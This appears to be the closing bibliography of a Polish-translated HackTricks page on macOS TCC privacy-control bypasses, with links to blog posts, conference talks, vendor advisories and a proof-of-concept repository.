- [9] [W malware XCSSET wykryto zero-day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: „To, co dzieje się na twoim Macu, pozostaje w iCloud Apple?!” - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nowa vulnerability macOS „powerdir” może prowadzić do nieautoryzowanego dostępu do danych użytkownika](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Zmiana katalogu domowego i obejście TCC, czyli CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Odtwarzanie muzyki i obejście TCC, czyli CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Jak okraść (Fire)foxa](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - omijanie TCC za pomocą Telegrama w macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - ujawnianie vulnerabilities Apple: audyt diskarbitrationd i storagekitd, część 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks i przechwytywanie zdarzeń CoreGraphics](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - ustawianie zmiennych środowiskowych w OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass i eskalacja uprawnień](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass przez zamontowanie systemu nad bazą danych TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Ponad 20 sposobów na obejście mechanizmów prywatności macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Zwycięstwo nad TCC - ponad 20 NOWYCH sposobów na obejście mechanizmów prywatności MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
